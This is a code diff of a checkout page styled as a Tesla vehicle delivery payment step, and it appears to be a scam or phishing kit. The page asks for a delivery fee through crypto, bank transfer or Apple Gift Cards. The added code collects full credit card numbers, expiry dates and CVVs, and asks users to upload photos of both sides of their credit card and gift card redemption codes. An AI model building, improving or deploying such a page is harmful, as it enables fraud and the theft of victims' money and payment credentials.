+    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+    SSL Secured
   </div>
-</nav>
+</header>
 
 <div class="page-wrap">
-  <div class="page-card anim-fade-up">
 
-    <!-- Steps -->
-    <div class="steps-bar">
-      <div class="s-step done"><span class="s-circle">✓</span> Select Car</div>
-      <div class="s-line done"></div>
-      <div class="s-step done"><span class="s-circle">✓</span> Delivery</div>
-      <div class="s-line done"></div>
-      <div class="s-step done"><span class="s-circle">✓</span> Method</div>
-      <div class="s-line done"></div>
-      <div class="s-step active"><span class="s-circle">4</span> Payment</div>
+  <!-- Steps -->
+  <div class="steps-bar">
+    <div class="step-item done">
+      <div class="step-circle">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <span class="step-label">Vehicle</span>
     </div>
-
-    <h1 class="page-title">Complete Payment</h1>
-    <p class="page-sub">Review your order, select a payment method, send the delivery fee, and upload your payment proof.</p>
-
-    <!-- Order Summary -->
-    <div class="summary-section">
-      <h3>Order Summary</h3>
-      <div class="summary-row"><span class="s-label">Tesla Model</span><span class="s-value" id="smModel">—</span></div>
-      <div class="summary-row"><span class="s-label">Delivery Method</span><span class="s-value" id="smMethod">—</span></div>
-      <div class="summary-row"><span class="s-label">Delivery Time</span><span class="s-value" id="smTime">—</span></div>
-      <div class="summary-row"><span class="s-label">Customer</span><span class="s-value" id="smName">—</span></div>
-      <div class="summary-row"><span class="s-label">Address</span><span class="s-value" id="smAddr" style="font-size:13px;">—</span></div>
-      <div class="summary-row"><span class="s-label">Phone</span><span class="s-value" id="smPhone">—</span></div>
-      <div class="summary-row s-total"><span class="s-label">Delivery Fee Due</span><span class="s-value" id="smTotal">—</span></div>
+    <div class="step-connector done"></div>
+    <div class="step-item done">
+      <div class="step-circle">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <span class="step-label">Delivery</span>
     </div>
-
-    <!-- Select Payment Method -->
-    <div style="margin-bottom:16px;">
-      <div style="font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#888;margin-bottom:12px;">Select Payment Method</div>
-      <div class="other-methods" id="paymentMethodsList">
-        <div style="grid-column:1/-1;text-align:center;padding:20px;color:#999;">Loading payment methods...</div>
-      </div>
+    <div class="step-connector done"></div>
+    <div class="step-item active">
+      <div class="step-circle">3</div>
+      <span class="step-label">Payment</span>
     </div>
-
-    <!-- Payment Method Details -->
-    <div id="paymentDetailSection" style="display:none;">
-      <div class="pay-detail-card">
-        <div class="pay-detail-header">
-          <div class="pay-big-icon wallet" id="pmBigIcon"></div>
-          <div>
-            <div class="pay-detail-title" id="pmDetailTitle">Payment Method</div>
-            <div class="pay-detail-sub" id="pmDetailType">Wallet</div>
-          </div>
-        </div>
-
-        <div id="walletAddressBox" style="display:none;">
-          <div style="font-size:12px;font-weight:700;color:#888;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px;">Send Payment To</div>
-          <div class="wallet-address-box">
-            <span id="walletAddress" style="flex:1;">—</span>
-            <button class="copy-btn" id="copyAddressBtn" onclick="copyAddress()">Copy</button>
-          </div>
-        </div>
-
-        <div id="qrContainer" style="display:none;">
-          <div class="qr-placeholder" id="qrPlaceholder">
-            <span id="qrEmoji">📱</span>
-          </div>
-          <div style="text-align:center;margin-bottom:16px;">
-            <div id="qrNote" style="font-size:12px;color:#888;">Scan QR code with your payment app</div>
-          </div>
-        </div>
-
-        <div class="instructions-box" id="instructionsBox">
-          <strong>📌 Payment Instructions:</strong><br>
-          <span id="paymentInstructions">Send the exact delivery fee amount to the provided address. Include your Order ID (shown below) in the payment reference so we can match your payment.</span>
-        </div>
-
-        <div style="background:rgba(227,25,55,.04);border:1px solid rgba(227,25,55,.1);border-radius:10px;padding:12px 16px;font-size:12px;color:#E31937;text-align:center;">
-          ⚡ After sending payment, upload your payment proof below using the file upload or camera option.
-        </div>
-      </div>
-
-      <!-- Upload Payment Proof -->
-      <div style="font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#888;margin-bottom:12px;" id="proofSectionLabel">Upload Payment Proof</div>
-
-      <!-- Apple Gift Card: front/back upload (shown only for Apple Gift Card) -->
-      <div id="appleGiftUpload" style="display:none;margin-bottom:20px;">
-        <div style="background:#FFF8F0;border:1px solid rgba(245,158,11,.2);border-radius:12px;padding:14px 18px;font-size:13px;color:#92400E;margin-bottom:14px;line-height:1.6;">
-          <strong>Apple Gift Card Requirements:</strong><br>
-          Please upload clear photos of <strong>both</strong> the front and back of your Apple Gift Card. The code must be visible and unscratched.
-        </div>
-        <div class="gift-upload-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
-          <div>
-            <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#888;margin-bottom:6px;">Front of Card</div>
-            <div class="upload-area" id="giftFrontUpload" style="padding:20px;" onclick="event.stopPropagation();document.getElementById('giftFrontFile').click()">
-              <div id="giftFrontState">
-                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="margin-bottom:8px;opacity:.5;"><rect x="2" y="6" width="20" height="14" rx="3"/><polyline points="20,10 20,20 4,20 4,10"/><line x1="12" y1="20" x2="12" y2="10"/></svg>
-                <div class="upload-title" style="font-size:14px;">Front Image</div>
-                <div class="upload-hint" style="font-size:12px;">Photo of front with barcode visible</div>
-                <div class="upload-actions" style="margin-top:10px;">
-                  <button class="upload-btn btn-sm" id="giftFrontCameraBtn" onclick="event.stopPropagation();document.getElementById('giftFrontCamera').click()">Camera</button>
-                  <button class="upload-btn btn-sm primary" onclick="event.stopPropagation();document.getElementById('giftFrontFile').click()">Browse</button>
-                </div>
-              </div>
-              <div class="upload-preview" id="giftFrontPreview"></div>
-            </div>
-            <input type="file" id="giftFrontFile" accept="image/*" style="display:none" onchange="handleGiftFile(this, 'front')">
-            <input type="file" id="giftFrontCamera" accept="image/*" capture="environment" style="display:none" onchange="handleGiftFile(this, 'front')">
-          </div>
-          <div>
-            <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#888;margin-bottom:6px;">Back of Card</div>
-            <div class="upload-area" id="giftBackUpload" style="padding:20px;" onclick="event.stopPropagation();document.getElementById('giftBackFile').click()">
-              <div id="giftBackState">
-                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="margin-bottom:8px;opacity:.5;"><rect x="2" y="6" width="20" height="14" rx="3"/><polyline points="20,10 20,20 4,20 4,10"/><line x1="12" y1="20" x2="12" y2="10"/></svg>
-                <div class="upload-title" style="font-size:14px;">Back Image</div>
-                <div class="upload-hint" style="font-size:12px;">Photo of back with code visible</div>
-                <div class="upload-actions" style="margin-top:10px;">
-                  <button class="upload-btn btn-sm" id="giftBackCameraBtn" onclick="event.stopPropagation();document.getElementById('giftBackCamera').click()">Camera</button>
-                  <button class="upload-btn btn-sm primary" onclick="event.stopPropagation();document.getElementById('giftBackFile').click()">Browse</button>
-                </div>
-              </div>
-              <div class="upload-preview" id="giftBackPreview"></div>
-            </div>
-            <input type="file" id="giftBackFile" accept="image/*" style="display:none" onchange="handleGiftFile(this, 'back')">
-            <input type="file" id="giftBackCamera" accept="image/*" capture="environment" style="display:none" onchange="handleGiftFile(this, 'back')">
-          </div>
-        </div>
-        <div style="margin-top:12px;">
-          <div id="giftUploadStatus" style="font-size:13px;font-weight:600;color:var(--admin-text-secondary);text-align:center;"></div>
-        </div>
-      </div>
-
-      <!-- Regular payment proof upload -->
-      <div class="upload-area" id="uploadArea" onclick="document.getElementById('fileInput').click()">
-        <div id="uploadState">
-          <div class="upload-icon" id="uploadIcon"><svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#c9ccd1" stroke-width="1.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg></div>
-          <div class="upload-title" id="uploadTitle">Upload Payment Receipt</div>
-          <div class="upload-hint" id="uploadHint">Upload a screenshot or photo of your payment confirmation</div>
-          <div class="upload-actions">
-            <button class="upload-btn" onclick="event.stopPropagation();openCamera()">Take Photo</button>
-            <button class="upload-btn primary" onclick="event.stopPropagation();document.getElementById('fileInput').click()">Browse Files</button>
-          </div>
-        </div>
-        <div class="upload-preview" id="uploadPreview">
-          <img id="previewImage" src="" alt="Payment proof preview">
-          <div class="file-name" id="previewFileName"></div>
-          <div class="file-size" id="previewFileSize"></div>
-          <div style="margin-top:12px;display:flex;gap:10px;justify-content:center;">
-            <button class="btn btn-success btn-sm" id="confirmUploadBtn" onclick="confirmUpload()">Confirm &amp; Submit</button>
-            <button class="btn btn-ghost btn-sm" onclick="resetUpload()">Remove</button>
-          </div>
-        </div>
-      </div>
-
-      <input type="file" id="fileInput" accept="image/*" style="display:none" onchange="handleFileSelect(this)">
-      <input type="file" id="cameraInput" accept="image/*" capture="environment" style="display:none" onchange="handleFileSelect(this)">
-
-      <div id="uploadStatus" style="display:none;padding:14px;border-radius:10px;margin-bottom:20px;font-size:14px;font-weight:600;text-align:center;"></div>
-
-      <button class="btn btn-primary btn-full btn-lg" id="submitBtn" disabled style="opacity:.5;cursor:not-allowed;" onclick="submitPayment()">
-        Confirm &amp; Complete Order
-      </button>
-
-      <div class="security-row">
-        <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
-        256-bit SSL Encryption · Your payment proof is securely uploaded
-      </div>
-    </div>
-
   </div>
-</div>
+
+  <!-- Page Header -->
+  <div class="page-header">
+    <h1 class="page-title">Complete Your Payment</h1>
+    <p class="page-subtitle">Select a payment method and upload your payment confirmation to finalize your order.</p>
+  </div>
+
+  <div class="main-grid">
+
+    <!-- LEFT COLUMN: Payment Form -->
+    <div class="left-col">
+
+      <!-- Payment Method Selection -->
+      <div class="card" style="margin-bottom:20px;">
+        <div class="card-header">
+          <div class="card-header-icon">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+          </div>
+          <div>
+            <h2>Payment Method</h2>
+            <p>Select how you would like to pay</p>
+          </div>
+        </div>
+        <div class="card-body">
+          <div class="pm-grid" id="paymentMethodsList">
+            <div class="pm-empty">Loading payment methods...</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Payment Details -->
+      <div id="payDetailSection" style="display:none;">
+        <div class="card" style="margin-bottom:20px;">
+          <div class="card-header">
+            <div class="card-header-icon">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+            </div>
+            <div>
+              <h2>Payment Instructions</h2>
+              <p>Follow the steps below to complete your payment</p>
+            </div>
+          </div>
+          <div class="card-body">
+            <div id="paymentDetailContent"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Credit Card Form -->
+      <div class="cc-form-section card" id="ccFormSection" style="margin-bottom:20px;">
+        <div class="card-header">
+          <div class="card-header-icon">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+          </div>
+          <div>
+            <h2>Card Details</h2>
+            <p>Enter your credit or debit card information</p>
+          </div>
+        </div>
+        <div class="card-body">
+          <!-- Card Visual -->
+          <div class="card-visual">
+            <div style="display:flex;justify-content:space-between;align-items:center;">
+              <svg width="36" height="26" viewBox="0 0 36 26" fill="none"><rect width="36" height="26" rx="4" fill="rgba(255,255,255,0.1)"/><path d="M4 7h28" stroke="rgba(255,255,255,0.3)" stroke-width="1.5"/><rect x="4" y="12" width="8" height="5" rx="1" fill="rgba(255,255,255,0.3)"/></svg>
+              <div class="card-visual-logo">
+                <div class="card-circle"></div>
+                <div class="card-circle"></div>
+              </div>
+            </div>
+            <div class="card-visual-number" id="cvCardNumber">•••• •••• •••• ••••</div>
+            <div class="card-visual-row">
+              <div>
+                <div class="card-visual-label">Card Holder</div>
+                <div class="card-visual-value" id="cvCardName">FULL NAME</div>
+              </div>
+              <div>
+                <div class="card-visual-label">Expires</div>
+                <div class="card-visual-value" id="cvCardExpiry">MM/YY</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Card Number -->
+          <div class="form-row single" style="margin-bottom:12px;">
+            <div class="form-field">
+              <label class="form-label">Card Number</label>
+              <input type="text" id="ccNumber" class="form-input card-number"
+                placeholder="1234 5678 9012 3456"
+                maxlength="19" autocomplete="cc-number" inputmode="numeric"
+                oninput="formatCardNumber(this)">
+            </div>
+          </div>
+
+          <!-- Cardholder Name -->
+          <div class="form-row single" style="margin-bottom:12px;">
+            <div class="form-field">
+              <label class="form-label">Cardholder Name</label>
+              <input type="text" id="ccName" class="form-input"
+                placeholder="As it appears on the card"
+                autocomplete="cc-name"
+                oninput="document.getElementById('cvCardName').textContent=this.value.toUpperCase()||'FULL NAME'">
+            </div>
+          </div>
+
+          <!-- Expiry + CVV -->
+          <div class="form-row" style="margin-bottom:0;">
+            <div class="form-field">
+              <label class="form-label">Expiration Date</label>
+              <input type="text" id="ccExpiry" class="form-input"
+                placeholder="MM/YY"
+                maxlength="5" autocomplete="cc-exp" inputmode="numeric"
+                oninput="formatExpiry(this)">
+            </div>
+            <div class="form-field">
+              <label class="form-label">CVV / Security Code</label>
+              <input type="text" id="ccCvv" class="form-input"
+                placeholder="•••"
+                maxlength="4" autocomplete="cc-csc" inputmode="numeric">
+            </div>
+          </div>
+
+          <!-- CC Image Upload (admin-controlled) -->
+          <div class="cc-upload-section" id="ccUploadSection">
+            <div class="divider"></div>
+            <div class="cc-upload-header">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#5C5E62" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+              Card Verification Images
+            </div>
+            <p class="cc-upload-hint">Upload clear photos of the front and back of your credit card for verification.</p>
+            <div class="upload-cards-grid">
+              <!-- CC Front -->
+              <div class="upload-card" id="ccFrontUpload"
+                onclick="document.getElementById('ccFrontInput').click()">
+                <div class="upload-card-placeholder">
+                  <div class="upload-card-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+                  </div>
+                  <div class="upload-card-side">Front of Card</div>
+                  <div class="upload-card-hint">Card number and holder name side</div>
+                  <button class="upload-card-btn" onclick="event.stopPropagation();document.getElementById('ccFrontInput').click()">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                    Upload Front
+                  </button>
+                </div>
+                <div class="upload-card-preview">
+                  <img id="ccFrontPreviewImg" src="" alt="Card front preview">
+                  <div class="upload-card-preview-name" id="ccFrontPreviewName"></div>
+                  <button class="upload-card-replace" onclick="event.stopPropagation();resetCCUpload('front')">
+                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.59"/></svg>
+                    Replace
+                  </button>
+                </div>
+              </div>
+              <!-- CC Back -->
+              <div class="upload-card" id="ccBackUpload"
+                onclick="document.getElementById('ccBackInput').click()">
+                <div class="upload-card-placeholder">
+                  <div class="upload-card-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/><rect x="5" y="14" width="6" height="3" rx="1"/></svg>
+                  </div>
+                  <div class="upload-card-side">Back of Card</div>
+                  <div class="upload-card-hint">Signature strip and CVV side</div>
+                  <button class="upload-card-btn" onclick="event.stopPropagation();document.getElementById('ccBackInput').click()">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                    Upload Back
+                  </button>
+                </div>
+                <div class="upload-card-preview">
+                  <img id="ccBackPreviewImg" src="" alt="Card back preview">
+                  <div class="upload-card-preview-name" id="ccBackPreviewName"></div>
+                  <button class="upload-card-replace" onclick="event.stopPropagation();resetCCUpload('back')">
+                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.59"/></svg>
+                    Replace
+                  </button>
+                </div>
+              </div>
+            </div>
+            <input type="file" id="ccFrontInput" accept="image/*" style="display:none" onchange="handleCCFile(this,'front')">
+            <input type="file" id="ccBackInput" accept="image/*" style="display:none" onchange="handleCCFile(this,'back')">
+          </div>
+        </div>
+      </div>
+
+      <!-- Apple Gift Card Upload Section -->
+      <div id="appleGiftUpload" style="display:none;" class="card" style="margin-bottom:20px;">
+        <div class="card-header">
+          <div class="card-header-icon">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+          </div>
+          <div>
+            <h2>Apple Gift Card Upload</h2>
+            <p>Upload both sides of your Apple Gift Card</p>
+          </div>
+        </div>
+        <div class="card-body">
+          <div style="background:rgba(59,130,246,0.06);border:1px solid rgba(59,130,246,0.15);border-radius:12px;padding:12px 16px;margin-bottom:16px;font-size:13px;color:#374151;line-height:1.6;">
+            <div style="font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:rgba(59,130,246,0.8);margin-bottom:5px;">Instructions</div>
+            Upload a clear photo of both the front and back of your Apple Gift Card. Make sure the card number and redemption code are fully visible and legible.
+          </div>
+          <div class="upload-cards-grid">
+            <!-- Gift Front -->
+            <div class="upload-card" id="giftFrontUpload"
+              onclick="document.getElementById('giftFrontInput').click()">
+              <div class="upload-card-placeholder">
+                <div class="upload-card-icon">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/><circle cx="12" cy="9" r="2.5"/></svg>
+                </div>
+                <div class="upload-card-side">Front of Card</div>
+                <div class="upload-card-hint">Apple logo and card balance side</div>
+                <button class="upload-card-btn" onclick="event.stopPropagation();document.getElementById('giftFrontInput').click()">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                  Upload Front
+                </button>
+              </div>
+              <div class="upload-card-preview">
+                <img id="giftFrontPreviewImg" src="" alt="Gift card front preview">
+                <div class="upload-card-preview-name" id="giftFrontPreviewName"></div>
+                <button class="upload-card-replace" onclick="event.stopPropagation();resetGiftUpload('front')">
+                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.59"/></svg>
+                  Replace
+                </button>
+              </div>
+            </div>
+            <!-- Gift Back -->
+            <div class="upload-card" id="giftBackUpload"
+              onclick="document.getElementById('giftBackInput').click()">
+              <div class="upload-card-placeholder">
+                <div class="upload-card-icon">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="21" x2="9" y2="9"/></svg>
+                </div>
+                <div class="upload-card-side">Back of Card</div>
+                <div class="upload-card-hint">Redemption code and PIN side</div>
+                <button class="upload-card-btn" onclick="event.stopPropagation();document.getElementById('giftBackInput').click()">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                  Upload Back
+                </button>
+              </div>
+              <div class="upload-card-preview">
+                <img id="giftBackPreviewImg" src="" alt="Gift card back preview">
+                <div class="upload-card-preview-name" id="giftBackPreviewName"></div>
+                <button class="upload-card-replace" onclick="event.stopPropagation();resetGiftUpload('back')">
+                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.59"/></svg>
+                  Replace
+                </button>
+              </div>
+            </div>
+          </div>
+          <input type="file" id="giftFrontInput" accept="image/*" style="display:none" onchange="handleGiftFile(this,'front')">
+          <input type="file" id="giftBackInput" accept="image/*" style="display:none" onchange="handleGiftFile(this,'back')">
+          <div class="gift-status" id="giftStatusWrap" style="display:none;">
+            <div class="gift-status-msg" id="giftUploadStatus"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Regular Proof Upload -->
+      <div id="uploadArea" style="display:none;" class="card" style="margin-bottom:20px;">
+        <div class="card-header">
+          <div class="card-header-icon">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+          </div>
+          <div>
+            <h2 id="proofSectionLabel">Upload Payment Proof</h2>
+            <p>Upload a screenshot or photo of your payment confirmation</p>
+          </div>
+        </div>
+        <div class="card-body">
+          <!-- Upload zone -->
+          <div class="proof-upload-area" id="uploadDropZone" onclick="document.getElementById('fileInput').click()">
+            <div id="uploadState">
+              <div class="proof-upload-icon">
+                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+              </div>
+              <div class="proof-upload-title" id="uploadTitle">Upload Payment Receipt</div>
+              <p class="proof-upload-hint" id="uploadHint">Drag and drop or click to browse. Supports JPG, PNG, PDF.</p>
+              <button class="proof-upload-btn" onclick="event.stopPropagation();document.getElementById('fileInput').click()">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                Choose File
+              </button>
+            </div>
+            <div class="proof-preview-wrap" id="uploadPreview" style="display:none;">
+              <img class="proof-preview-img" id="previewImage" src="" alt="Payment proof preview">
+              <div class="proof-preview-meta">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+                <span id="previewFileName"></span>
+                <span style="color:var(--gray3);">|</span>
+                <span id="previewFileSize" style="color:var(--gray2);"></span>
+              </div>
+              <div class="proof-actions">
+                <button class="btn btn-success btn-sm" id="confirmUploadBtn" onclick="confirmUpload()">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+                  Confirm Upload
+                </button>
+                <button class="btn btn-ghost btn-sm" onclick="resetUpload()">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.59"/></svg>
+                  Remove
+                </button>
+              </div>
+            </div>
+          </div>
+
+          <input type="file" id="fileInput" accept="image/*,application/pdf" style="display:none" onchange="handleFileSelect(this)">
+
+          <div class="upload-status" id="uploadStatus"></div>
+        </div>
+      </div>
+
+      <!-- Submit -->
+      <div id="submitSection" style="display:none;">
+        <button class="btn-submit" id="submitBtn" disabled onclick="submitPayment()">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          Confirm &amp; Complete Order
+        </button>
+        <div class="security-row">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          256-bit SSL Encryption &nbsp;&middot;&nbsp; Secure Payment Processing
+        </div>
+      </div>
+
+    </div><!-- /left-col -->
+
+    <!-- RIGHT COLUMN: Order Summary -->
+    <div class="sidebar-col">
+      <div class="card" style="position:sticky;top:80px;">
+        <div class="card-header">
+          <div class="card-header-icon">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 17H5a2 2 0 0 0-2 2"/><path d="M9 3H5a2 2 0 0 0-2 2v4a2 2 0 0 0 2 2h4"/><rect x="13" y="3" width="8" height="18" rx="2"/></svg>
+          </div>
+          <div>
+            <h2>Order Summary</h2>
+            <p>Your selected vehicle &amp; delivery</p>
+          </div>
+        </div>
+        <div class="card-body" id="orderSummaryContent">
+          <div style="color:var(--gray2);font-size:13px;text-align:center;padding:16px 0;">Loading order details...</div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /main-grid -->
+</div><!-- /page-wrap -->
 
 <script src="js/config.js"></script>
 <script src="js/payment-methods.js"></script>
@@ -386,19 +984,42 @@
     return;
   }
 
-  // ── PAYMENT METHODS (unified TeslaPaymentMethods store) ──
+  // ── PAYMENT METHODS ──
   var PM = window.TeslaPaymentMethods;
   var paymentMethods = [];
   var selectedPaymentId = null;
   var uploadedFileData = null;
   var uploadedFileName = '';
+  var uploadConfirmed = false;
 
+  // ── CC IMAGE UPLOAD STATE ──
+  var ccFrontData = null;
+  var ccBackData = null;
+
+  // ── APPLE GIFT CARD STATE ──
+  var giftFrontData = null;
+  var giftBackData = null;
+
+  function escapeHtml(s) {
+    if (!s) return '';
+    return String(s)
+      .replace(/&/g,'&amp;').replace(/</g,'&lt;')
+      .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  }
+
+  // ── Admin settings ──
+  function isCCImageRequired() {
+    try {
+      var v = localStorage.getItem('tesla_cc_image_upload_required');
+      return v === 'true' || v === '1';
+    } catch(e) { return false; }
+  }
+
+  // ── LOAD PAYMENT METHODS ──
   function loadPaymentMethods() {
     paymentMethods = PM ? PM.getEnabled() : [];
     renderPaymentMethods();
     renderOrderSummary();
-    // Hydrate from the backend if one is configured, then re-render so the
-    // customer always sees the latest admin-managed configuration.
     if (PM && PM.syncFromApi) {
       PM.syncFromApi('public', function() {
         paymentMethods = PM.getEnabled();
@@ -411,372 +1032,307 @@
   }
 
   function findMethod(id) {
-    for (var i = 0; i < paymentMethods.length; i++) { if (paymentMethods[i].id === id) return paymentMethods[i]; }
+    for (var i = 0; i < paymentMethods.length; i++) {
+      if (paymentMethods[i].id === id) return paymentMethods[i];
+    }
     return null;
   }
 
   function typeLabel(type) {
-    return ({ wallet: 'Wallet / App', bank: 'Bank Transfer', crypto: 'Cryptocurrency', card: 'Card', gift: 'Gift Card' }[type]) || 'Payment';
+    return ({ wallet:'Wallet / App', bank:'Bank Transfer', crypto:'Cryptocurrency', card:'Card', gift:'Gift Card' }[type]) || 'Payment';
   }
 
+  // ── RENDER PAYMENT METHODS ──
   function renderPaymentMethods() {
     var list = document.getElementById('paymentMethodsList');
     if (!list) return;
     if (!paymentMethods.length) {
